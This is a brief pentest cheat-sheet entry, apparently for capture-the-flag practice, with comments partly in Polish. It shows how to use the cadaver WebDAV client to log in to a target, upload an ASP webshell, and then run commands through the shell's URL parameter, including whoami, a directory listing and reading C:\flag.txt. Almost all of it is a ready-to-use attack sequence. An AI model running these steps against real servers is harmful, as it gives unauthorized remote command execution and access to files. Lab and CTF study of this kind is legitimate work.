# $ cadaver

Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.

```bash
$ cadaver
> open http://target/webdav
 username: ...
 password: ...
> put /usr/share/webshells/asp/webshell.asp # wgranie webshella na server
# otworzyć webshell w przeglądarce

http://target/webdav/webshell.asp?cmd=whoami
http://target/webdav/webshell.asp?cmd=dir+C%3A%5C
http://target/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
```